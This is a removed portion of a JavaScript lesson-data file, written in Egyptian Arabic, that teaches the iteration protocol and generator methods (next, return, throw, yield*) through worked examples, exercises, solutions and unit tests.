-            when: R`iterator بإيدك (object بـ [[next]]): لما محتاج تحكّم كامل وأداء (من غير generator)، أو مكتبة بتلف على data structure بتاعتها. [[return]]: في أي iterator ماسك resource. iterable بيرجّع iterator جديد كل مرة: لأي collection (زي [[Map]] و [[Set]]). iterator بيرجّع [[this]]: لأي «تيار» بيتستهلك مرة (ملف، network، generator). [[extends Iterator]]: لما عايز iterator بتاعك ياخد [[map]] و [[filter]] و [[take]] ببلاش (درس «Iterator helpers»). وفي الغالب generator ([[function*]]) أسهل من ده كله، وبيعمل [[return]] لوحده (الدرس الجاي).`,
-            mistakes: R`- [[ [Symbol.iterator]() { return this } ]] على collection بدل iterator جديد: تاني لفة فاضية.
-- تنسى [[done: true]] فالـ loop متخلصش، أو ترجّع [[undefined]] بدل object: [[Iterator result undefined is not an object]].
-- تحط القفل في [[return]] بس: اللفة الكاملة مبتناديهاش، فاقفل في آخر [[next]] كمان.
-- تفتكر [[for...of]] بينادي [[throw]] لما يحصل error: بينادي [[return]].
-- تنادي [[next()]] بإيدك وتسيب الـ iterator: محدش هيقفله غيرك.
-- [[return]] نفسها ترجّع حاجة مش object: [[TypeError: Iterator result 5 is not an object]] (اتجرّب).
-- تلف بـ [[for...in]] على iterable: [[for...in]] بيلف على مفاتيح الـ object مش على البروتوكول (درس «for...of و for...in»).`,
-          },
-          teach: R`## الفكرة في سطر
-
-[[for...of]] بيطلب iterator من الحاجة، ويفضل يقول له «اللي بعده» لحد ما يقول «خلصت»، ولو خرج بدري بيقول له «اقفل». الناتج من Node 24.22.
-
----
-
-## ١. iterable ولا iterator
-
-| | **iterable** | **iterator** |
-|---|---|---|
-| عنده إيه | [[ [Symbol.iterator]() ]] | [[next()]]، واختياري [[return()]] و [[throw()]] |
-| بيعمل إيه | بيدّيك iterator جديد | بيمسك مكانك ويدّيك القيمة اللي بعدها |
-| أمثلة | array و string و Map و Set و arguments و NodeList | [[arr.values()]] و [[map.entries()]] وأي generator object |
-| تلف عليه كام مرة | كل ما تحب، كل مرة iterator جديد | مرة واحدة، بيتستهلك |
-
-والـ iterators الجاهزة **كمان** iterables: عندهم [[ [Symbol.iterator]() ]] بترجّع [[this]]، عشان تقدر تكتب [[for (const v of map.values())]].
-
----
-
-## ٢. [[next()]] و [[{ value, done }]]
-
-~~~js
-function countdown(from) {
-  let n = from;
-  return {
-    [Symbol.iterator]() { return this; },
-    next() { return n > 0 ? { value: n--, done: false } : { value: undefined, done: true }; },
-    return(value) { console.log('  return اتنادت'); n = 0; return { value, done: true }; },
-  };
-}
-for (const x of countdown(2)) console.log('for', x);
-~~~
-
-~~~text الناتج
-for 2
-for 1
-~~~
-
-- [[countdown(2)]] بترجّع object هو iterator و iterable في نفس الوقت ([[return this]]).
-- [[next()]]: لو لسه فيه رجّع [[{ value: n--, done: false }]] ([[n--]] بترجّع القيمة الحالية وبعدين تنقص)، وإلا [[{ value: undefined, done: true }]].
-- اللفة خلصت لوحدها، و**مفيش** «return اتنادت»: الـ iterator خلص بنفسه ومفيش حاجة تتقفل.
-
----
-
-## ٣. [[return()]]: مين بيناديها
-
-~~~js
-for (const x of countdown(5)) { console.log('break بعد', x); break; }
-const [first, second] = countdown(5);
-console.log('destructuring', first, second, [...countdown(3)]);
-try { for (const x of countdown(5)) throw new Error('boom'); } catch (e) { console.log('caught', e.message); }
-~~~
-
-~~~text الناتج
-break بعد 5
-  return اتنادت
-  return اتنادت
-destructuring 5 4 [ 3, 2, 1 ]
-  return اتنادت
-caught boom
-~~~
-
-- [[break]]: خرج بعد أول قيمة، فـ [[return]] اتنادت.
-- [[const [first, second] = countdown(5)]]: خد اتنين والـ iterator لسه فيه ٣، فقفله. أما [[[...countdown(3)]]] لف لآخره فمفيش [[return]].
-- error جوه الـ loop: [[return]] اتنادت **الأول**، وبعدين الـ error كمّل لحد الـ [[catch]].
-
-اتجرّبت كل الحالات (عدد الـ [[next]] اللي اتنادت وبعدها هل [[return]] اتنادت):
-
-| اللي حصل | [[return]] اتنادت؟ |
-|---|---|
-| [[for...of]] لحد الآخر | لأ، الـ iterator خلص بنفسه |
-| [[break]] أو [[return]] من الدالة أو [[continue outer]] | أيوه، ده الخروج البدري الأساسي |
-| error جوه الـ body | أيوه، والـ error بيكمّل |
-| [[const [a, b] = it]] والـ iterator لسه فيه | أيوه، خد اللي محتاجه وقفل |
-| [[const [a, ...rest] = it]] أو spread أو [[Array.from(it)]] | لأ، لفّوا لآخره |
-| [[new Map(it)]] وعنصر مش [[[key, value]]] | أيوه، وبعدين بيرمي [[TypeError: Iterator value 3 is not an entry object]] |
-| [[Array.from(it, fn)]] و [[fn]] رمت | أيوه، وبعدين الـ error بيكمّل |
-| iterator معندوش [[return]] خالص | محدش بيقفل، ولو لفّيت عليه تاني بيكمّل من مكانه |
-
----
-
-## ٤. [[throw()]]: مش للـ loops
-
-حطيت [[throw()]] و [[return()]] على iterator، ورميت error جوه [[for...of]]: اتطبع [[return called]] بس. [[throw]] بتبعت error **جوه** الـ iterator عشان هو يتعامل معاه، وده منطقي بس مع الـ generator (فيه [[try...catch]] حوالين [[yield]]) و [[yield*]] اللي بيوصّلها للـ generator الداخلي. ده كله الدرس الجاي.
-
----
-
-## ٥. [[Iterator]]: الأب المشترك
-
-~~~js
-const it = [10, 20][Symbol.iterator]();
-console.log(it[Symbol.iterator]() === it, it instanceof Iterator, it.next(), [...it]);
-~~~
-
-~~~text الناتج
-true true { value: 10, done: false } [ 20 ]
-~~~
-
-- [[ it[Symbol.iterator]() === it ]]: الـ iterator بيرجّع نفسه (من [[Iterator.prototype]]).
-- [[it instanceof Iterator]]: كل iterators اللغة (array و Map و Set و string و [[matchAll]] و generators) بيورثوا من [[Iterator.prototype]]، فعليهم كلهم [[map]] و [[filter]] و [[take]].
-- [[it.next()]] خد 10، والـ spread كمّل من مكانه: [[[ 20 ]]] بس.
-
-وأنواعهم بالـ [[Symbol.toStringTag]] (الدرس اللي فات): [[[object Array Iterator]]] و [[[object Map Iterator]]] و [[[object String Iterator]]] و [[[object RegExp String Iterator]]].
-
-### iterator بتاعك يورث منه
-
-~~~js
-class Counter extends Iterator { #n = 0; next() { return this.#n < 3 ? { value: this.#n++, done: false } : { value: undefined, done: true }; } }
-console.log([...new Counter()], new Counter().map((x) => x * 10).toArray(), Object.prototype.toString.call(new Counter()));
-~~~
-
-~~~text الناتج
-[ 0, 1, 2 ] [ 0, 10, 20 ] [object Iterator]
-~~~
-
-كتبنا [[next]] بس، وخدنا [[ [Symbol.iterator] ]] و [[map]] و [[toArray]] من [[Iterator.prototype]]. و [[new Iterator()]] لوحده ممنوع: [[TypeError: Abstract class Iterator not directly constructable]].
-
----
-
-## ٦. رسايل الأخطاء
-
-| الكود | الرسالة (Node 24.22) |
-|---|---|
-| [[const obj = { a: 1 }]] وبعدين [[for (const x of obj)]] | [[TypeError: obj is not iterable]]: الرسالة فيها اسم المتغير |
-| [[const [z] = 5]] | [[TypeError: 5 is not iterable]]: الرقم ملوش [[Symbol.iterator]] |
-| [[ [Symbol.iterator]() { return 5 } ]] | [[TypeError: Result of the Symbol.iterator method is not an object]]: لازم ترجّع object فيه [[next]] |
-| [[next() { return 5 }]] | [[TypeError: Iterator result 5 is not an object]]: لازم ترجّع [[{ value, done }]] كل مرة |
-
----
-
-## الخلاصة
-
-- iterable بيدّي iterator، والـ iterator بيدّي [[{ value, done }]].
-- [[return()]] بتتنادى في الخروج البدري بس (break و error و destructuring جزئي)، مش في اللفة الكاملة، فاقفل في المكانين.
-- [[throw()]] للـ generators و [[yield*]]، مش للـ loops.
-- [[Iterator.prototype]] أبو كل الـ iterators، و [[extends Iterator]] بيدّيك الـ helpers.`,
-          lines: [
-            R`دالة بترجّع iterator بإيدنا، من غير generator، عشان نشوف البروتوكول كله.`,
-            R`العدّاد اللي الـ iterator ماسكه: هو «المكان» اللي واقف عنده.`,
-            R`بنرجّع object هيبقى iterable و iterator في نفس الوقت.`,
-            R`[[ [Symbol.iterator] ]] بترجّع [[this]]: الـ iterator نفسه، فينفع [[for...of]] يلف عليه، بس مرة واحدة.`,
-            R`[[next]]: لو [[n]] لسه أكبر من صفر بيرجّع القيمة الحالية وينقصها، وإلا [[done: true]].`,
-            R`[[return]]: اللي بيلف بيناديها لما يخرج بدري. بتطبع، وتصفّر العدّاد (فأي [[next]] بعدها [[done]])، وترجّع [[done: true]].`,
-            R`قفلة الـ object.`,
-            R`قفلة [[countdown]].`,
-            R`لفة كاملة: [[for 2]] و [[for 1]]، ومن غير [[return]] لأن الـ iterator خلص بنفسه.`,
-            R`[[break]] بعد أول قيمة، فـ [[for...of]] نادى [[return]] لوحده.`,
-            R`الـ destructuring خد أول قيمتين (5 و 4) والـ iterator لسه فيه، فقفله بـ [[return]].`,
-            R`بيطبع القيمتين، والـ spread لف [[countdown(3)]] لآخره فطلّع [[[ 3, 2, 1 ]]] من غير [[return]].`,
-            R`error جوه الـ loop: [[return]] بتتنادى الأول، وبعدين الـ error بيكمّل للـ [[catch]] اللي طبع [[caught boom]].`,
-            R`iterator جاهز من array، عشان نقارنه باللي عملناه.`,
-            R`[[true]] (بيرجّع نفسه) و [[true]] (بيورث من [[Iterator]])، و [[next]] خد 10، والـ spread كمّل من مكانه: [[[ 20 ]]].`,
-          ],
-          ref: [
-            { t: "MDN: Iteration protocols", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Iteration_protocols" },
-            { t: "MDN: Iterator", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Iterator" },
-            { t: "MDN: Iterator.prototype[Symbol.iterator]()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Iterator/Symbol.iterator" },
-            { t: "MDN: Symbol.iterator", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/iterator" },
-            { t: "ECMAScript: Iteration (IteratorClose)", url: "https://tc39.es/ecma262/multipage/control-abstraction-objects.html#sec-iteration" },
-          ],
-          pre: [{ to: "js/iterators و generators", why: R`[[Symbol.iterator]] و [[next]] و [[function*]] في أبسط صورهم` }, { to: "js/for...of و for...in", why: R`[[for...of]] من برّه` }, { to: "js/array destructuring و spread", why: R`الـ destructuring والـ spread اللي بيستخدموا البروتوكول` }],
-        },
-        {
-          cmd: "Generator: next و return و throw و yield*",
-          title: "الـ generator بيتكلم في الاتجاهين: تبعت له قيمة بـ next، وتقفله بـ return، وترمي جواه بـ throw، وتسلّم لغيره بـ yield*",
-          desc: R`الـ generator object (اللي بيرجع من نداء [[function*]]) عنده ٣ methods، وكلهم بيكمّلوا الدالة من عند آخر [[yield]] واقفة عنده:
-• [[gen.next(value)]]: كمّل، و [[value]] تبقى **نتيجة** الـ [[yield]] اللي كانت واقفة ([[const name = yield '...']]). أول [[next]] بيتجاهل قيمته، لأن لسه مفيش [[yield]] مستنية.
-• [[gen.return(value)]]: كمّل كأن الـ [[yield]] بقت [[return value]]: الـ [[finally]] بيشتغل، والنتيجة [[{ value, done: true }]].
-• [[gen.throw(error)]]: كمّل كأن الـ [[yield]] رمت [[error]]: لو فيه [[try...catch]] حواليها بيمسكه ويكمّل، وإلا بيطلع برّه لحد اللي نادى [[throw]].
-
-و [[yield* other]] بيسلّم الشغل لـ generator أو iterable تاني لحد ما يخلص: كل [[next]] و [[return]] و [[throw]] بيوصلوا للداخلي، وقيمة [[yield*]] نفسها هي الـ [[return]] بتاع الداخلي.`,
-          example: R`// generator بيتكلم في الاتجاهين: next(value) و return و throw
-function* checkout() {
-  try {
-    const name = yield 'اسمك إيه؟';
-    const qty = yield $__bt$__{name}، كام قطعة؟$__bt;
-    if (!(qty > 0)) throw new Error('الكمية لازم تبقى أكبر من صفر');
-    return { name, qty };
-  } finally {
-    console.log('  اتقفل');
-  }
-}
-const c = checkout();
-console.log(c.next('هيتجاهل'));
-console.log(c.next('Sara'));
-console.log(c.next(3));
-const c2 = checkout();
-c2.next();
-console.log(c2.return('ألغى'));
-const c3 = checkout();
-c3.next();
-try { c3.throw(new Error('timeout')); } catch (e) { console.log('برّه:', e.message); }`,
-          try: R`اعمل [[function* ids(prefix)]] لانهائي بيطلّع [['INV-1']] و [['INV-2']]...، ولو حد بعت [[true]] في [[next(true)]] العدّاد يرجع لـ 1. وبعدين [[function* roundRobin(...workers)]] بيلف على العمّال للأبد، وخد منه ٥ بـ [[take(5).toArray()]].`,
-          sol: R`~~~js ids.mjs
-function* ids(prefix) { let n = 1; while (true) { const reset = yield prefix + '-' + n++; if (reset) n = 1; } }
-const g = ids('INV');
-console.log(g.next().value, g.next().value, g.next(true).value, g.next().value);
-function* roundRobin(...workers) { for (let i = 0; ; i = (i + 1) % workers.length) yield workers[i]; }
-console.log(roundRobin('a', 'b', 'c').take(5).toArray());
-~~~
-
-~~~text الناتج (Node 24.22)
-INV-1 INV-2 INV-1 INV-2
-[ 'a', 'b', 'c', 'a', 'b' ]
-~~~
-
-- [[g.next(true)]]: الـ [[yield]] اللي كانت طلّعت [['INV-2']] رجّعت [[true]]، فـ [[n = 1]]، والـ loop لفت وطلّعت [['INV-1']].
-- الـ [[while (true)]] والـ [[for]] من غير شرط مش بيعلّقوا البرنامج: كل [[yield]] بيوقف الدالة لحد الطلب الجاي.
-- [[i = (i + 1) % workers.length]]: باقي القسمة بيرجّع [[i]] لصفر بعد آخر عامل.`,
-          practice: [
-            { lvl: 'سريع', t: R`**اقرا وتوقّع:** الـ [[finally]] هنا فيها [[yield]]. اكتب الـ ٤ سطور (والسطر اللي جوه الـ [[finally]]) بالترتيب:
-
-~~~js
-function* stubborn() {
-  try { yield 1; yield 2; }
-  finally { yield 'cleanup'; console.log('  finally خلص'); }
-}
-const s = stubborn();
-console.log(s.next());
-console.log(s.return('stop'));
-console.log(s.next());
-console.log(s.next());
-~~~`, done: R`توقّعت إن [[return('stop')]] **مرجّعتش** [[done: true]] على طول، وكتبت الترتيب صح.`, sol: R`~~~text الناتج (Node 24.22)
-{ value: 1, done: false }
-{ value: 'cleanup', done: false }
-  finally خلص
-{ value: 'stop', done: true }
-{ value: undefined, done: true }
-~~~
-
-- [[return('stop')]] كمّل الدالة كأن الـ [[yield 1]] بقت [[return 'stop']]، فدخل الـ [[finally]]... ولقى [[yield]] فوقف عندها. فالنتيجة [[{ value: 'cleanup', done: false }]].
-- [[next()]] اللي بعدها كمّلت الـ [[finally]] للآخر، وساعتها الـ [[return]] المؤجّلة كمّلت: [[{ value: 'stop', done: true }]].
-- **الدرس:** [[finally]] للتنضيف بس (قفل ملف، مسح timer)، متحطش فيها [[yield]]: هتخلي [[break]] في [[for...of]] «ميقفلش» زي ما اللي بيلف فاكر.` },
-            { lvl: 'تطبيق', t: R`**ابني:** [[function* runningAverage()]]: كل ما تبعت رقم بـ [[next(x)]] بيرجّع المتوسط لحد دلوقتي. أي حاجة مش رقم (أو [[NaN]]) بتتجاهل ويرجع نفس المتوسط. أول [[next()]] بيرجّع [[null]] (لسه مفيش أرقام).`, done: R`بعد [[next()]] الأولى: [[next(10)]] بـ 10، و [[next(20)]] بـ 15، و [[next('x')]] بـ 15، و [[next(60)]] بـ 30، والتمرين اللي بيتصحح لوحده عدّى.`, sol: R`~~~js running-average.mjs
-function* runningAverage() {
-  let sum = 0, count = 0, avg = null;
-  while (true) {
-    const x = yield avg;
-    if (typeof x !== 'number' || Number.isNaN(x)) continue;
-    sum += x; count++;
-    avg = sum / count;
-  }
-}
-const avg = runningAverage();
-avg.next();
-console.log(avg.next(10).value, avg.next(20).value, avg.next('x').value, avg.next(60).value);
-~~~
-
-~~~text الناتج (Node 24.22)
-10 15 15 30
-~~~
-
-**الشرح:** [[const x = yield avg]] بتعمل حاجتين: تطلّع [[avg]] الحالي لبرّه، وتستنى، ولما [[next(x)]] ييجي تبقى قيمتها [[x]]. فالحالة ([[sum]] و [[count]]) عايشة جوه الدالة من غير class ولا closure. أول [[next()]] لازم: بيشغّل الدالة لحد أول [[yield]] (اللي بتطلّع [[null]])، ومن غيره أول رقم هيضيع. و [[continue]] بيرجع لأول الـ loop فيطلّع نفس [[avg]].` },
-            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** الـ logger ده بيضيّع أول سطر. ليه؟ واكتب [[primed(genFn)]] بترجّع دالة بتعمل الـ generator وتنادي أول [[next()]] لوحدها.
-
-~~~js
-function* logger() {
-  while (true) { const line = yield; console.log('LOG:', line); }
-}
-const bad = logger();
-bad.next('server started');
-bad.next('request /home');
-~~~`, done: R`النسخة المصلّحة بتطبع السطرين، وتقدر تقول القيمة الأولى راحت فين.`, sol: R`~~~text الناتج قبل التصليح (Node 24.22)
-LOG: request /home
-~~~
-
-أول [[next('server started')]] شغّل الدالة من أولها لحد أول [[yield]] ووقف. القيمة اللي اتبعتت ملهاش [[yield]] مستنياها، فاتجاهلت (حسب المواصفة). ده اسمه إن الـ generator لازم يتعمله **priming**.
-
-~~~js logger-fixed.mjs
-function* logger() {
-  while (true) { const line = yield; console.log('LOG:', line); }
-}
-function primed(genFn) {
-  return (...args) => { const g = genFn(...args); g.next(); return g; };
-}
-const log = primed(logger)();
-log.next('server started');
-log.next('request /home');
-~~~
-
-~~~text الناتج (Node 24.22)
-LOG: server started
-LOG: request /home
-~~~
-
-**الشرح:** [[primed]] higher-order function: بتاخد generator function وبترجّع دالة بنفس الـ arguments ([[...args]])، بتعمل الـ generator وتوصّله لأول [[yield]] قبل ما تسلّمه. ده نمط «coroutine» قديم (من Python)، ومفيد لأي generator بيستقبل أكتر ما بيطلّع.` },
-            { lvl: 'تحدي', t: R`**مسألة:** [[function* walk(node, path)]] بيلف على شجرة ملفات ([[{ name, children }]]، والملف ملوش [[children]]) ويطلّع مسار كل ملف ([['/src/lib/a.js']]). وكمان **بيرجّع** ([[return]]) عدد الملفات، وكل فولدر بيعرف عدد ملفاته من [[yield*]] على ولاده.`, done: R`المسارات التلاتة طالعين بالترتيب، و [[return]] النهائي 3، والفولدر الفاضي بيقول 0، والتمرين اللي بيتصحح لوحده عدّى.`, sol: R`~~~js walk.mjs
-function* walk(node, path = '') {
-  const here = path + '/' + node.name;
-  if (!node.children) { yield here; return 1; }
-  let files = 0;
-  for (const child of node.children) files += yield* walk(child, here);
-  console.log('  ' + here + ': ' + files + ' ملف');
-  return files;
-}
-const tree = { name: 'src', children: [{ name: 'app.js' }, { name: 'lib', children: [{ name: 'a.js' }, { name: 'b.js' }] }, { name: 'empty', children: [] }] };
-const it = walk(tree);
-const paths = [];
-let r;
-while (!(r = it.next()).done) paths.push(r.value);
-console.log(paths, 'المجموع', r.value);
-~~~
-
-~~~text الناتج (Node 24.22)
-  /src/lib: 2 ملف
-  /src/empty: 0 ملف
-  /src: 3 ملف
-[ '/src/app.js', '/src/lib/a.js', '/src/lib/b.js' ] المجموع 3
-~~~
-
-**الشرح:** [[yield* walk(child, here)]] ليها شغلانتين: كل [[yield]] جوه الـ child بتطلع برّه على طول (فالمسارات بتوصل للي بيلف)، ولما الـ child يخلص، قيمة الـ expression **هي الـ [[return]] بتاعه**، فبنجمعها في [[files]]. ليه [[while]] بـ [[next()]] بإيدنا مش [[for...of]]؟ لأن [[for...of]] و spread **بيرموا** قيمة الـ [[return]] (الـ [[value]] اللي مع [[done: true]])، وإحنا عايزين المجموع.` },
-            { lvl: 'تحدي', t: R`**محاكاة:** مكنة مشروبات سعرها 12: [[function* vendingMachine(price)]]. كل [[next(coin)]] بيدخّل عملة (1 أو 5 أو 10 بس، الباقي مرفوض)، وبيطلّع [[{ state: 'waiting', paid, need }]]، ولما الفلوس تكفي [[{ state: 'drink', change }]] ويرجع للأول. و [[throw(new Error(...))]] = زرار الإلغاء: يرجّع الفلوس اللي اتدفعت ويبدأ من الأول **من غير** ما المكنة تقف.`, done: R`10 ثم 3 (مرفوضة) ثم 5 بيطلّعوا مشروب والباقي 3، وبعد 5 و [[throw]] بتطبع «رجّعنا 5» والمكنة بتقول [[paid: 0]] ولسه شغالة، و [[return()]] بيقفلها.`, sol: R`~~~js vending.mjs
-function* vendingMachine(price) {
-  let paid = 0;
-  while (true) {
-    try {
-      while (paid < price) {
-        const coin = yield { state: 'waiting', paid, need: price - paid };
-        if (![1, 5, 10].includes(coin)) { console.log('  عملة مرفوضة:', coin); continue; }
-        paid += coin;
-      }
-      yield { state: 'drink', change: paid - price };
-      paid = 0;
-    } catch (e) {
-      console.log('  إلغاء (' + e.message + '): رجّعنا', paid);
-      paid = 0;
-    }
-  }
-}
-const m = vendingMachine(12);
-console.log(m.next().value);
-console.log(m.next(10).value);
-console.log(m.next(3).value);
-console.log(m.next(5).value);
-console.log(m.next().value);
-console.log(m.next(5).value);
-console.log(m.throw(new Error('زرار الإلغاء')).value);
-console.log(m.return().done);
-~~~
-
-~~~text الناتج (Node 24.22)
-{ state: 'waiting', paid: 0, need: 12 }
-{ state: 'waiting', paid: 10, need: 2 }
-  عملة مرفوضة: 3
-{ state: 'waiting', paid: 10, need: 2 }
-{ state: 'drink', change: 3 }
-{ state: 'waiting', paid: 0, need: 12 }
-{ state: 'waiting', paid: 5, need: 7 }
-  إلغاء (زرار الإلغاء): رجّعنا 5
-{ state: 'waiting', paid: 0, need: 12 }
-true
-~~~
-
-**الشرح:** الـ state machine كلها في مكان الـ [[yield]]: «مستني عملة» = واقف عند الـ [[yield]] اللي جوه. [[m.throw(...)]] بيرمي الـ error **في مكان الـ [[yield]] الواقفة**، فالـ [[catch]] مسكه، ورجّع الفلوس، والـ [[while (true)]] الخارجية لفت للـ [[yield]] الجاية: فـ [[throw]] رجّعت القيمة دي مباشرة. لو مكنش فيه [[try...catch]]، الـ error كان هيطلع للي نادى [[throw]] والمكنة تتقفل للأبد. و [[return()]] مش محتاجة [[finally]]: بتقفل وخلاص.` },
-          ],
-          check: { lang: "js", starter: R`function* walk(node, path = '') {
-  // yield مسار كل ملف، و return عدد الملفات (yield* بيرجّع return بتاع الولد)
-}`, tests: R`const tree = { name: 'src', children: [{ name: 'app.js' }, { name: 'lib', children: [{ name: 'a.js' }, { name: 'b.js' }] }, { name: 'empty', children: [] }] };
-const drain = (it) => { const out = []; let r; while (!(r = it.next()).done) out.push(r.value); return [out, r.value]; };
-test("المسارات بالترتيب", () => expect(drain(walk(tree))[0]).toEqual(['/src/app.js', '/src/lib/a.js', '/src/lib/b.js']));
-test("return = عدد الملفات", () => expect(drain(walk(tree))[1]).toBe(3));
-test("ملف لوحده", () => expect(drain(walk({ name: 'x.txt' }))).toEqual([ ['/x.txt'], 1]));
-test("فولدر فاضي", () => expect(drain(walk({ name: 'empty', children: [] }))).toEqual([ [], 0]));
-test("for...of بيشتغل كمان", () => expect([...walk(tree)].length).toBe(3));`, solution: R`function* walk(node, path = '') {
-  const here = path + '/' + node.name;
-  if (!node.children) { yield here; return 1; }
-  let files = 0;
-  for (const child of node.children) files += yield* walk(child, here);
-  return files;
-}` },
-          flag: "script",
-          deep: {
-            why: R`الـ generator مش بس «iterator أسهل»: هو دالة تقدر توقفها وتكمّلها وتبعت لها قيم وترمي جواها. ده بيخلي state machines (wizard، مكنة، parser، protocol) تتكتب كأنها كود متسلسل عادي بدل [[switch]] على [[state]]. وده بالظبط اللي async/await اتبنى عليه: [[await]] هي [[yield]] لـ Promise، والـ runtime بينادي [[next(result)]] لما تخلص و [[throw(error)]] لو فشلت.`,
-            how: R`الـ generator object عنده حالة داخلية: suspendedStart (لسه متشغّلش) أو suspendedYield (واقف عند [[yield]]) أو executing أو completed. كل method بتكمّل التنفيذ بـ «completion» مختلف في مكان الـ [[yield]] الواقفة:
-- [[next(v)]]: normal completion، فالـ [[yield]] قيمتها [[v]].
-- [[return(v)]]: return completion، فبيعدّي على كل [[finally]] اللي حواليه وبعدين يخلص بـ [[v]]. ولو الـ [[finally]] عملت [[yield]]، بيقف هناك والـ return مستنية.
-- [[throw(e)]]: throw completion، فبيدوّر على [[catch]] حوالين الـ [[yield]].
-
-ولو الـ generator لسه في suspendedStart: [[return(v)]] بيخلّصه على طول من غير ما يشغّل ولا سطر (ولا الـ [[finally]] لأنه مدخلش الـ [[try]] أصلًا)، و [[throw(e)]] بيرمي برّه على طول ويخلّصه. ولو حد نادى [[next]] والـ generator في executing (نادى نفسه من جوه): [[TypeError: Generator is already running]].
-
-و [[yield* inner]] بيعمل loop: بياخد iterator من [[inner]] ويفضل يمرّر له كل [[next]] و [[throw]] و [[return]] من برّه (لو الداخلي معندوش [[throw]]، بيقفله بـ [[return]] ويرمي [[TypeError: The iterator does not provide a 'throw' method.]])، ولما الداخلي يقول [[done: true]] قيمة الـ [[yield*]] هي [[value]] بتاعته.`,
-            when: R`[[next(value)]]: wizards وأسئلة متتالية، و coroutines بتستقبل داتا (logger، تجميع، parser بيتغذى chunk chunk). [[return()]]: لما انت اللي بتلف بإيدك وعايز تقفل بدري (و [[for...of]] بيعملها لوحده). [[throw()]]: تبلّغ الـ generator بفشل حصل برّه (timeout، إلغاء، رد غلط من السيرفر) عشان يقرر هو يعمل retry ولا يقفل. [[yield*]]: recursion على شجر، وتقسيم generator كبير لأجزاء، وتسلسل iterables ورا بعض.`,
-            mistakes: R`- تبعت قيمة في أول [[next]] ومستنيها توصل: بتضيع. اعمل priming.
-- [[yield]] جوه [[finally]]: [[return]] و [[break]] مبيقفلوش زي ما انت فاكر.
-- [[for...of]] أو spread وعايز قيمة الـ [[return]]: بيرموها، استخدم [[next()]] بإيدك أو [[yield*]].
-- تفتكر [[throw]] على generator متشغّلش بيدخل الـ [[catch]]: لأ، بيطلع برّه على طول (اتجرّب: [[outside: before start]]) والـ generator بيخلص.
-- generator بينادي [[next]] على نفسه: [[TypeError: Generator is already running]].
-- [[yield]] جوه callback ([[arr.forEach(x => yield x)]]): الملف مش بيتكمبايل أصلًا، والرسالة مضللة: [[SyntaxError: missing ) after argument list]] (Node 24.22)، لأن الـ [[yield]] لازم تبقى في الـ generator نفسه، مش دالة جواه. استخدم [[for...of]] أو [[yield*]].
-- [[new]] على generator function: [[TypeError: talk is not a constructor]].`,
-          },
-          teach: R`## الفكرة في سطر
-
-[[yield]] مش بس بتطلّع قيمة: هي **نقطة وقوف** بيدخل منها ٣ حاجات: قيمة ([[next]])، أو أمر بالخروج ([[return]])، أو error ([[throw]]). الناتج من Node 24.22.
-
----
-
-## ١. [[next(value)]]: تبعت قيمة جوه
-
-~~~js
-function* checkout() {
-  try {
-    const name = yield 'اسمك إيه؟';
-    const qty = yield $__bt$__{name}، كام قطعة؟$__bt;
-    if (!(qty > 0)) throw new Error('الكمية لازم تبقى أكبر من صفر');
-    return { name, qty };
-  } finally {
-    console.log('  اتقفل');
-  }
-}
-const c = checkout();
-console.log(c.next('هيتجاهل'));
-console.log(c.next('Sara'));
-console.log(c.next(3));
-~~~
-
-~~~text الناتج
-{ value: 'اسمك إيه؟', done: false }
-{ value: 'Sara، كام قطعة؟', done: false }
-  اتقفل
-{ value: { name: 'Sara', qty: 3 }, done: true }
-~~~
-
-تابع الـ [[next]] التلاتة:
-
-| النداء | الدالة كمّلت من فين لفين | الـ [[yield]] رجّعت | النتيجة |
-|---|---|---|---|
-| [[c.next('هيتجاهل')]] | من الأول لأول [[yield]] | مفيش [[yield]] مستنية، فالقيمة ضاعت | السؤال الأول |
-| [[c.next('Sara')]] | من أول [[yield]] لتاني واحدة | [[name = 'Sara']] | السؤال التاني فيه الاسم |
-| [[c.next(3)]] | من تاني [[yield]] للآخر | [[qty = 3]] | [[return]] بالـ object و [[done: true]]، والـ [[finally]] اشتغلت قبلها |
-
----
-
-## ٢. [[return(value)]]: اقفل دلوقتي
-
-~~~js
-const c2 = checkout();
-c2.next();
-console.log(c2.return('ألغى'));
-~~~
-
-~~~text الناتج
-  اتقفل
-{ value: 'ألغى', done: true }
-~~~
-
-- الـ generator كان واقف عند السؤال الأول. [[return('ألغى')]] خلّى الـ [[yield]] دي تتصرف كأنها [[return 'ألغى']]، فخرج من الـ [[try]] والـ [[finally]] اشتغلت.
-- ده بالظبط اللي [[for...of]] بيعمله لما تعمل [[break]] (درس «iteration protocols»)، فالـ [[finally]] في generator = مكان التنضيف المضمون.
-- لو الـ generator لسه متشغّلش خالص: [[return('early')]] بترجّع [[{ value: 'early', done: true }]] **من غير** ما الـ [[finally]] تشتغل (اتجرّب)، لأنه مدخلش الـ [[try]] أصلًا.
-
----
-
-## ٣. [[throw(error)]]: ارمي جوه
-
-~~~js
-const c3 = checkout();
-c3.next();
-try { c3.throw(new Error('timeout')); } catch (e) { console.log('برّه:', e.message); }
-~~~
-
-~~~text الناتج
-  اتقفل
-برّه: timeout
-~~~
-
-الـ error اترمى **في مكان الـ [[yield]]**. مفيش [[catch]] جوه [[checkout]]، فالـ [[finally]] اشتغلت والـ error طلع لحد اللي نادى [[throw]]، والـ generator خلص.
-
-### لو فيه [[catch]] جوه
-
-~~~js
-function* safe() {
-  while (true) {
-    try { const v = yield; console.log('  value', v); }
-    catch (e) { console.log('  caught inside:', e.message); }
-  }
-}
-const sf = safe(); sf.next();
-sf.next('a'); console.log(sf.throw(new Error('bad input'))); sf.next('b');
-~~~
-
-~~~text الناتج
-  value a
-  caught inside: bad input
-{ value: undefined, done: false }
-  value b
-~~~
-
-الـ [[catch]] مسكه، والـ loop كمّلت للـ [[yield]] الجاية، فـ [[throw]] **رجّعت** القيمة اللي اتطلّعت هناك والـ generator لسه شغال.
-
-| حالة الـ generator | [[gen.throw(e)]] بيعمل إيه |
-|---|---|
-| واقف عند [[yield]] جوه [[try...catch]] | الـ [[catch]] بيمسك، وبيرجّع الـ [[yield]] الجاية |
-| واقف عند [[yield]] من غير [[catch]] | [[finally]] لو فيه، وبعدين الـ error يطلع برّه والـ generator يخلص |
